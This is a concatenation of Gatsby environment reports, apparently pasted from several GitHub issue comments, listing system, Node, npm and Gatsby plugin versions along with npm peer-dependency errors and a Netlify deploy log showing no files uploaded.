``` system: os: macos 10.15.7 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.7.0 - ~/.asdf/shims/node yarn: 1.22.5 - ~/.yarn/bin/yarn npm: 6.14.5 - ~/.config/yarn/global/node_modules/.bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.75 firefox: 72.0.1 safari: 14.0
$ gatsby info --clipboard
bash: gatsby: command not found $ node -v
v12.18.3 $ npm -v
6.14.6 $ npm ls --depth=0 -global
c:\\users\\catal\\userscatalappdataroamingnpm
`-- gatsby-cli@2.12.107 npm err! peer dep missing: gatsby@^2.6.0, required by gatsby-interface@0.0.193
npm err! peer dep missing: react-dom@^16.8.1, required by gatsby-interface@0.0.193
npm err! peer dep missing: acorn@^6.0.0, required by acorn-dynamic-import@4.0.0
npm err! peer dep missing: @mdx-js/react@^1.0.0, required by theme-ui@0.2.52
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/alert@0.10.3
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/combobox@0.10.3
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/dialog@0.10.3
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/menu-button@0.10.3
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/popover@0.10.3
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/tabs@0.10.3
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/tooltip@0.10.3
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/visually-hidden@0.10.4
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/auto-id@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/descendants@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/popover@0.10.3
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/portal@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/portal@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/auto-id@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/descendants@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/popover@0.10.3
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/portal@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/rect@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/auto-id@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/descendants@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/auto-id@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/portal@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/rect@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/utils@0.10.5
npm err! peer dep missing: react-dom@^16.8.0, required by @reach/visually-hidden@0.10.4
output of `gatsby info --clipboard`: ``` system: os: linux 4.15 ubuntu 18.04.5 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i3-7100u cpu @ 2.40ghz shell: 4.4.20 - /bin/bash binaries: node: 14.12.0 - /usr/bin/node npm: 6.14.8 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: firefox: 81.0 npmpackages: gatsby: ^2.24.67 => 2.24.67 gatsby-plugin-styled-components: ^3.3.14 => 3.3.14 npmglobalpackages: gatsby-cli: 2.12.107
system: os: macos 10.15.7 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh
binaries: node: 12.18.4 - ~/.nvm/versions/node/v12.18.4/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.8 - ~/.nvm/versions/node/v12.18.4/bin/npm
languages: python: 2.7.17 - /usr/local/bin/python
browsers: chrome: 86.0.4240.75 edge: 86.0.622.38 firefox: 81.0.1 safari: 14.0
npmpackages: gatsby: ^2.24.73 => 2.24.73 gatsby-image: ^2.4.20 => 2.4.20 gatsby-plugin-amp: ^0.2.2 => 0.2.2 gatsby-plugin-feed: ^2.5.13 => 2.5.13 gatsby-plugin-google-tagmanager: ^2.3.13 => 2.3.13 gatsby-plugin-react-helmet: ^3.3.12 => 3.3.12 gatsby-plugin-remove-generator: ^1.0.6 => 1.0.6 gatsby-plugin-sass: ^2.3.14 => 2.3.14 gatsby-plugin-sharp: ^2.6.37 => 2.6.38 gatsby-plugin-sitemap: ^2.4.14 => 2.4.14 gatsby-plugin-twitter: ^2.3.12 => 2.3.12 gatsby-remark-copy-linked-files: ^2.3.17 => 2.3.17 gatsby-source-filesystem: ^2.3.31 => 2.3.31 gatsby-transformer-remark: ^2.8.36 => 2.8.36 gatsby-transformer-sharp: ^2.5.16 => 2.5.16 gatsby-transformer-yaml: ^2.4.13 => 2.4.13 npmglobalpackages: gatsby-cli: 2.12.106 gatsby-dev-cli: 2.7.21
ide: vscode 1.49.3 x64 - using git-bash version 2.23.0.windows.1 as default terminal system: os: windows 10 10.0.19041 cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz binaries: node: 12.18.3 - ~\\appdata\\local\\temp\\yarn--1602241778964-0.05746843170514704\ ode.cmd yarn: 1.22.4 - ~\\appdata\\local\\temp\\yarn--1602241778964-0.05746843170514704\\yarn.cmd npm: 6.14.6 - c:\\program files\ odejs\ pm.cmd browsers: edge: spartan (44.19041.423.0), chromium (85.0.564.70) npmpackages: gatsby: ^2.24.66 => 2.24.66 gatsby-image: ^2.4.20 => 2.4.20 gatsby-plugin-google-analytics: ^2.3.15 => 2.3.15 gatsby-plugin-manifest: ^2.4.32 => 2.4.32 gatsby-plugin-mdx: ^1.2.46 => 1.2.46 gatsby-plugin-offline: ^3.2.29 => 3.2.29 gatsby-plugin-react-helmet: ^3.3.12 => 3.3.12 gatsby-plugin-sharp: ^2.6.37 => 2.6.37 gatsby-plugin-styled-components: ^3.3.12 => 3.3.12 gatsby-plugin-typography: ^2.5.12 => 2.5.12 gatsby-remark-images: ^3.3.33 => 3.3.33 gatsby-remark-prismjs: ^3.5.16 => 3.5.16 gatsby-source-filesystem: ^2.3.31 => 2.3.31 gatsby-source-medium: ^2.3.12 => 2.3.12 gatsby-transformer-sharp: ^2.5.16 => 2.5.16 would like to submit a pr is possible
``` system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-8559u cpu @ 2.70ghz shell: 5.0.18 - /usr/local/bin/bash binaries: node: 14.8.0 - ~/.nvm/versions/node/v14.8.0/bin/node yarn: 1.22.10 - /usr/local/bin/yarn npm: 6.14.7 - ~/.nvm/versions/node/v14.8.0/bin/npm languages: python: 2.7.17 - /users/asd/.pyenv/shims/python browsers: chrome: 86.0.4240.75 firefox: 81.0.1 safari: 14.0 npmpackages: gatsby: ^2.24.70 => 2.24.72 ```
``` system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 14.4.0 - ~/.nvm/versions/node/v14.4.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.4.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.121 firefox: 81.0 safari: 14.0 npmpackages: gatsby: ^2.24.72 => 2.24.72 gatsby-image: ^2.4.20 => 2.4.20 gatsby-plugin-layout: ^1.3.13 => 1.3.13 gatsby-plugin-manifest: ^2.4.33 => 2.4.33 gatsby-plugin-offline: ^3.2.30 => 3.2.30 gatsby-plugin-react-helmet: ^3.3.12 => 3.3.12 gatsby-plugin-sharp: ^2.6.38 => 2.6.38 gatsby-source-filesystem: ^2.3.32 => 2.3.32 gatsby-transformer-sharp: ^2.5.16 => 2.5.16 npmglobalpackages: gatsby-cli: 2.12.80
``` hi to @wardpeet and @blainekasten who may have seen my misplaced comments on this issue in a merged pr thread!
``` system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) shell: 5.8 - /bin/zsh binaries: node: 10.16.0 - /tmp/yarn--1602164833852-0.12649155661585176/node yarn: 1.21.1 - /tmp/yarn--1602164833852-0.12649155661585176/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.18 - /usr/bin/python browsers: chrome: 86.0.4240.75 npmpackages: gatsby: ^2.20.15 => 2.24.71 gatsby-image: ^2.3.2 => 2.4.21 gatsby-plugin-csp: ^1.1.3 => 1.1.3 gatsby-plugin-manifest: ^2.3.3 => 2.4.34 gatsby-plugin-mdx: ^1.2.26 => 1.2.46 gatsby-plugin-offline: ^3.1.2 => 3.2.31 gatsby-plugin-react-helmet: ^3.2.1 => 3.3.13 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sass: ^2.2.1 => 2.3.16 gatsby-plugin-sharp: ^2.5.4 => 2.6.39 gatsby-plugin-sri: ^1.1.0 => 1.1.0 gatsby-plugin-typescript: ^2.3.1 => 2.4.21 gatsby-plugin-typescript-checker: ^1.1.1 => 1.1.1 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-source-filesystem: ^2.2.2 => 2.3.34 gatsby-transformer-sharp: ^2.4.4 => 2.5.17 ```
system: os: linux 4.15 ubuntu 16.04.7 lts (xenial xerus) cpu: (8) x64 intel(r) core(tm) i7-7700 cpu @ 3.60ghz shell: 5.1.1 - /usr/bin/zsh binaries: node: 12.14.0 - ~/.nvm/versions/node/v12.14.0/bin/node yarn: 1.21.1 - ~/.nvm/versions/node/v12.14.0/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.0/bin/npm languages: python: 2.7.12 - /usr/bin/python browsers: chrome: 85.0.4183.83 firefox: 80.0.1 npmpackages: gatsby: ^2.24.67 => 2.24.67 gatsby-theme-blog: ^2.0.2 => 2.0.2 npmglobalpackages: gatsby-cli: 2.12.102
the website is hosted in vercel, information about environments (browser, os, etc) is inside each recording
here is my local environment, this bug its not happening in local (that i know of)
``` system: os: macos 10.15.7 cpu: (8) x64 intel(r) core(tm) i7-4750hq cpu @ 2.00ghz shell: 3.2.57 - /bin/bash binaries: node: 10.17.0 - ~/.nvm/versions/node/v10.17.0/bin/node npm: 6.11.3 - ~/.nvm/versions/node/v10.17.0/bin/npm languages: python: 3.8.1 - /users/alejandrosanchez/.pyenv/shims/python browsers: chrome: 85.0.4183.121 safari: 14.0 npmpackages: gatsby: ^2.24.2 => 2.24.2 gatsby-background-image: ^1.1.2 => 1.1.2 gatsby-image: ^2.4.14 => 2.4.14 gatsby-plugin-gdpr-cookies: ^1.0.7 => 1.0.7 gatsby-plugin-google-tagmanager: ^2.1.25 => 2.1.25 gatsby-plugin-manifest: ^2.2.14 => 2.2.21 gatsby-plugin-meta-redirect: ^1.1.1 => 1.1.1 gatsby-plugin-offline: ^3.0.2 => 3.0.14 gatsby-plugin-react-helmet: ^3.1.22 => 3.1.22 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sharp: ^2.2.19 => 2.2.29 gatsby-plugin-sitemap: ^2.2.27 => 2.2.27 gatsby-plugin-styled-components: ^3.1.4 => 3.1.9 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-plugin-zeit-now: ^0.2.0 => 0.2.0 gatsby-remark-images: ^3.3.27 => 3.3.27 gatsby-remark-lazy-image-url: ^1.0.1 => 1.0.1 gatsby-remark-lazy-load: ^1.0.2 => 1.0.2 gatsby-remark-reading-time: ^1.1.0 => 1.1.0 gatsby-source-filesystem: ^2.1.21 => 2.1.31 gatsby-transformer-remark: ^2.6.32 => 2.6.32 gatsby-transformer-sharp: ^2.2.13 => 2.2.21 gatsby-transformer-yaml: ^2.2.15 => 2.2.15 npmglobalpackages: gatsby-cli: 2.11.5
system: os: macos 10.15.7 cpu: (4) x64 intel(r) core(tm) i5-4278u cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.1 - /usr/local/bin/node yarn: 1.22.5 - ~/.yarn/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 85.0.4183.121 firefox: 81.0.1 safari: 14.0 npmpackages: gatsby: 2.15.14 => 2.15.14 gatsby-background-image: ^0.8.9 => 0.8.9 gatsby-cli: ^2.7.47 => 2.7.47 gatsby-image: ^2.2.18 => 2.2.18 gatsby-plugin-catch-links: ^2.1.9 => 2.1.9 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.16 => 2.2.16 gatsby-plugin-netlify-cms: ^4.1.14 => 4.1.14 gatsby-plugin-offline: ^3.0.6 => 3.0.6 gatsby-plugin-react-helmet: ^3.1.7 => 3.1.7 gatsby-plugin-react-svg: ^2.1.1 => 2.1.2 gatsby-plugin-sharp: ^2.2.21 => 2.2.21 gatsby-plugin-styled-components: ^3.1.5 => 3.1.5 gatsby-remark-autolink-headers: ^2.1.13 => 2.1.13 gatsby-remark-custom-blocks: ^2.1.9 => 2.1.9 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^3.1.21 => 3.1.21 gatsby-remark-lazy-load: ^1.0.1 => 1.0.1 gatsby-remark-picture: ^1.0.1 => 1.0.1 gatsby-remark-prismjs: ^3.3.13 => 3.3.13 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-remark-unwrap-images: ^1.0.1 => 1.0.1 gatsby-source-filesystem: ^2.1.22 => 2.1.22 gatsby-transformer-remark: ^2.6.22 => 2.6.22 gatsby-transformer-sharp: ^2.2.14 => 2.2.14
system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.11.0 - /usr/local/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.121 safari: 14.0 npmpackages: gatsby: ^2.24.67 => 2.24.67 gatsby-image: =2.4.20 => 2.4.20 gatsby-plugin-breakpoints: ^1.2.4 => 1.2.4 gatsby-plugin-google-analytics: ^2.3.14 => 2.3.14 gatsby-plugin-manifest: ^2.4.31 => 2.4.31 gatsby-plugin-material-ui: ^2.1.10 => 2.1.10 gatsby-plugin-react-helmet: ^3.3.12 => 3.3.12 gatsby-plugin-sharp: ^2.6.36 => 2.6.36 gatsby-plugin-sitemap: ^2.4.13 => 2.4.13 gatsby-remark-images: ^3.3.30 => 3.3.30 gatsby-source-filesystem: ^2.3.30 => 2.3.30 gatsby-theme-material-ui: ^1.0.13 => 1.0.13 gatsby-transformer-remark: ^2.8.35 => 2.8.35 gatsby-transformer-sharp: =2.5.16 => 2.5.16
``` system: os: macos 11.0 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.8 - /bin/zsh binaries: node: 12.18.3 - /usr/local/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.6 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.121 safari: 14.0.1 npmpackages: gatsby: ^2.24.66 => 2.24.66 gatsby-image: ^2.4.20 => 2.4.20 gatsby-plugin-manifest: ^2.4.32 => 2.4.32 gatsby-plugin-offline: ^3.2.29 => 3.2.29 gatsby-plugin-postcss: ^3.0.0 => 3.0.0 gatsby-plugin-react-helmet: ^3.3.12 => 3.3.12 gatsby-plugin-sharp: ^2.6.37 => 2.6.37 gatsby-plugin-styled-components: ^3.3.12 => 3.3.12 gatsby-source-filesystem: ^2.3.31 => 2.3.31 gatsby-transformer-sharp: ^2.5.16 => 2.5.16 npmglobalpackages: gatsby: 2.24.54
``` system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.3 - ~/.nvm/versions/node/v12.18.3/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.8 - ~/.nvm/versions/node/v12.18.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 firefox: 80.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.66 => 2.24.66 gatsby-image: ^2.4.20 => 2.4.20 gatsby-plugin-manifest: ^2.4.32 => 2.4.32 gatsby-plugin-offline: ^3.2.29 => 3.2.29 gatsby-plugin-react-helmet: ^3.3.12 => 3.3.12 gatsby-plugin-sharp: ^2.6.37 => 2.6.37 gatsby-source-filesystem: ^2.3.31 => 2.3.31 gatsby-transformer-sharp: ^2.5.16 => 2.5.16 npmglobalpackages: gatsby-cli: 2.12.102
system: os: windows 10 10.0.19041 cpu: (4) x64 intel(r) core(tm) i5 cpu 661 @ 3.33ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.8 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: chrome: 85.0.4183.121 edge: spartan (44.19041.423.0), chromium (85.0.564.68) npmpackages: gatsby: ^2.24.66 => 2.24.66 gatsby-image: ^2.4.20 => 2.4.20 gatsby-plugin-manifest: ^2.4.32 => 2.4.32 gatsby-plugin-offline: ^3.2.29 => 3.2.29 gatsby-plugin-react-helmet: ^3.3.12 => 3.3.12 gatsby-plugin-sharp: ^2.6.37 => 2.6.37 gatsby-plugin-webpack-bundle-analyser-v2: ^1.1.13 => 1.1.13 gatsby-source-filesystem: ^2.3.31 => 2.3.31 gatsby-transformer-sharp: ^2.5.16 => 2.5.16 npmglobalpackages: gatsby-cli: 2.12.100
system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i7-3770 cpu @ 3.40ghz shell: 5.0.17 - /bin/bash binaries: node: 14.10.1 - /usr/bin/node yarn: 1.22.5 - /usr/bin/yarn npm: 6.14.8 - /usr/bin/npm browsers: chrome: 85.0.4183.102 firefox: 81.0
system: os: windows 10 10.0.18363 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe yarn: 1.22.5 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.2 browsers: chrome: 85.0.4183.121 edge: spartan (44.18362.449.0) npmpackages: gatsby: ^2.24.66 => 2.24.66 gatsby-image: ^2.4.20 => 2.4.20 gatsby-plugin-manifest: ^2.4.32 => 2.4.32 gatsby-plugin-netlify-cms: ^4.3.15 => 4.3.15 gatsby-plugin-netlify-cms-paths: ^1.3.0 => 1.3.0 gatsby-plugin-react-helmet: ^3.3.12 => 3.3.12 gatsby-plugin-sharp: ^2.6.37 => 2.6.37 gatsby-plugin-sitemap: ^2.4.14 => 2.4.14 gatsby-source-filesystem: ^2.3.31 => 2.3.31 gatsby-transformer-remark: ^2.8.36 => 2.8.36 gatsby-transformer-sharp: ^2.5.16 => 2.5.16 npmglobalpackages: gatsby-cli: 2.12.101 it says published, but everything is blank.
also, on the netlify log: 4:32:57 am: starting to deploy site from 'public'
4:32:58 am: creating deploy tree 4:32:58 am: creating deploy upload records
**4:32:58 am: 0 new files to upload
4:32:58 am: 0 new functions to upload**
4:32:58 am: starting post processing
system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.4 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.6 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.121 firefox: 80.0.1 safari: 14.0 npmpackages: gatsby: ^2.24.67 => 2.24.67 gatsby-image: ^2.4.20 => 2.4.20 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.4.33 => 2.4.33 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.3.12 => 3.3.12 gatsby-plugin-sharp: ^2.6.38 => 2.6.38 gatsby-plugin-sitemap: ^2.4.14 => 2.4.14 gatsby-plugin-styled-components: ^3.3.12 => 3.3.12 gatsby-source-filesystem: ^2.3.32 => 2.3.32 gatsby-source-wordpress: ^3.3.36 => 3.3.36 gatsby-source-wordpress-menus: ^1.1.4 => 1.1.4 gatsby-transformer-sharp: ^2.5.16 => 2.5.16 npmglobalpackages: gatsby-cli: 2.12.100 gatsby: 2.24.66
``` system: os: macos 10.15.5 cpu: (4) x64 intel(r) core(tm) i5-8210y cpu @ 1.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.11.0 - /usr/local/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.121 safari: 13.1.1 npmpackages: gatsby: 2.24.57 => 2.24.57 gatsby-image: 2.4.14 => 2.4.14 gatsby-plugin-graphql-codegen: 2.7.1 => 2.7.1 gatsby-plugin-mdx: 1.2.30 => 1.2.30 gatsby-plugin-netlify-cms: 4.1.28 => 4.1.28 gatsby-plugin-react-helmet: 3.1.15 => 3.1.15 gatsby-plugin-root-import: 2.0.5 => 2.0.5 gatsby-plugin-sharp: 2.6.25 => 2.6.25 gatsby-plugin-styled-components: 3.1.20 => 3.1.20 gatsby-plugin-typescript: 2.1.19 => 2.1.19 gatsby-remark-images: 3.3.25 => 3.3.25 gatsby-remark-unwrap-images: 1.0.2 => 1.0.2 gatsby-source-filesystem: 2.1.46 => 2.1.46 gatsby-transformer-sharp: 2.5.13 => 2.5.13
``` system: os: windows 10 10.0.19041 cpu: (8) x64 intel(r) core(tm) i7-8565u cpu @ 1.80ghz binaries: node: 10.18.1 - c:\\program files\ odejs\ ode.exe npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.6 browsers: chrome: 85.0.4183.121 edge: spartan (44.19041.423.0) npmpackages: gatsby: ^2.24.66 => 2.24.66 gatsby-cli: ^2.12.101 => 2.12.101 gatsby-image: ^2.4.20 => 2.4.20 gatsby-plugin-catch-links: ^2.3.13 => 2.3.13 gatsby-plugin-feed: ^2.5.13 => 2.5.13 gatsby-plugin-layout: ^1.3.12 => 1.3.12 gatsby-plugin-manifest: ^2.4.32 => 2.4.32 gatsby-plugin-netlify: ^2.3.16 => 2.3.16 gatsby-plugin-offline: ^2.0.6 => 2.2.10 gatsby-plugin-react-helmet: ^3.3.12 => 3.3.12 gatsby-plugin-react-svg: ^2.0.0 => 2.1.2 gatsby-plugin-sass: ^2.3.14 => 2.3.14 gatsby-plugin-sharp: ^2.6.37 => 2.6.37 gatsby-plugin-sitemap: ^2.4.14 => 2.4.14 gatsby-plugin-styled-jsx: ^3.3.13 => 3.3.13 gatsby-plugin-styled-jsx-postcss: ^2.0.2 => 2.0.2 gatsby-remark-copy-linked-files: ^2.3.17 => 2.3.17 gatsby-remark-emojis: ^0.2.3 => 0.2.5 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^2.0.1 => 2.0.6 gatsby-remark-prismjs: ^3.5.14 => 3.5.14 gatsby-remark-responsive-iframe: ^2.4.15 => 2.4.15 gatsby-remark-smartypants: ^2.3.12 => 2.3.12 gatsby-source-filesystem: ^2.3.31 => 2.3.31 gatsby-transformer-remark: ^2.8.36 => 2.8.36 gatsby-transformer-sharp: ^2.5.16 => 2.5.16 npmglobalpackages: gatsby: 2.24.57
``` system: os: macos 11.0 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.8 - /bin/zsh binaries: node: 14.12.0 - /usr/local/bin/node npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.121 edge: 85.0.564.63 firefox: 80.0.1 safari: 14.0.1 npmglobalpackages: gatsby-cli: 2.12.101
``` system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 14.5.0 - /usr/local/bin/node npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.121 edge: 85.0.564.63 firefox: 73.0.1 safari: 13.1.2 npmpackages: gatsby: ^2.24.2 => 2.24.2 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-env-variables: ^2.0.0 => 2.0.0 gatsby-image: ^2.4.9 => 2.4.13 gatsby-plugin-anchor-links: ^1.1.1 => 1.1.1 gatsby-plugin-graphql-codegen: ^2.7.1 => 2.7.1 gatsby-plugin-manifest: ^2.4.14 => 2.4.18 gatsby-plugin-offline: ^3.2.18 => 3.2.18 gatsby-plugin-page-transitions: ^1.0.8 => 1.0.8 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.10 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.21 => 2.6.22 gatsby-source-contentful: ^2.3.46 => 2.3.46 gatsby-source-filesystem: ^2.3.14 => 2.3.19 gatsby-transformer-remark: ^2.8.25 => 2.8.25 gatsby-transformer-sharp: ^2.5.7 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.60 ```
system: os: linux 4.4 ubuntu 20.04.1 lts (focal fossa) cpu: (2) x64 intel(r) xeon(r) cpu e5-2620 v4 @ 2.10ghz shell: 5.0.17 - /bin/bash binaries: node: 14.12.0 - ~/.nvm/versions/node/v14.12.0/bin/node npm: 6.14.8 - /usr/bin/npm npmglobalpackages: gatsby-cli: 2.12.101
``` system: os: linux 5.8 arch linux cpu: (8) x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz shell: 3.1.2 - /usr/bin/fish binaries: node: 13.13.0 - ~/.config/nvm/13.13.0/bin/node yarn: 1.22.5 - /usr/bin/yarn npm: 6.14.4 - ~/.config/nvm/13.13.0/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: firefox: 81.0 npmpackages: gatsby: ^2.24.63 => 2.24.63 gatsby-image: ^2.4.19 => 2.4.19 gatsby-plugin-manifest: ^2.4.30 => 2.4.30 gatsby-plugin-offline: ^3.2.28 => 3.2.28 gatsby-plugin-preact: 4.0.12 => 4.0.12 gatsby-plugin-react-helmet: ^3.3.11 => 3.3.11 gatsby-plugin-sharp: ^2.6.36 => 2.6.36 gatsby-source-filesystem: ^2.3.30 => 2.3.30 gatsby-transformer-sharp: ^2.5.15 => 2.5.15 ```
when running: "gatsby develop"
system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.3 - ~/.nvm/versions/node/v12.18.3/bin/node npm: 6.14.8 - ~/.nvm/versions/node/v12.18.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.121 safari: 14.0 npmpackages: gatsby: ^2.24.63 => 2.24.63 gatsby-plugin-manifest: ^2.4.31 => 2.4.31 gatsby-source-filesystem: ^2.3.30 => 2.3.30 npmglobalpackages: gatsby-cli: 2.12.68
os: macos 10.15.2
cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz
shell: 3.2.57 - /bin/bash
node: 10.16.0 - /usr/local/bin/node
yarn: 1.21.1 - /usr/local/bin/yarn
npm: 6.9.0 - /usr/local/bin/npm
python: 2.7.16 - /usr/bin/python
chrome: 83.0.4103.116
firefox: 78.0.1
safari: 13.0.4
npmglobalpackages:
gatsby-cli: 2.6.7
[ej2-13795-gatsby-automation-6ssporwhibtzvep3ularn7ioubuzrik4mulebtplvfgiz2yjbtrq] running shell script
+ gatsby info --clipboard \x1b[4msystem:\x1b[0m os: linux 4.15 ubuntu 18.04.5 lts (bionic beaver) cpu: (4) x64 intel(r) xeon(r) cpu e5-2650 v4 @ 2.20ghz shell: 4.4.20 - /bin/bash \x1b[4mbinaries:\x1b[0m node: 10.22.1 - /usr/bin/node npm: 6.5.0 - /usr/bin/npm \x1b[4mnpmpackages:\x1b[0m gatsby-cli: 2.11.1 => 2.11.1 \x1b[4mnpmglobalpackages:\x1b[0m gatsby-cli: 2.4.1
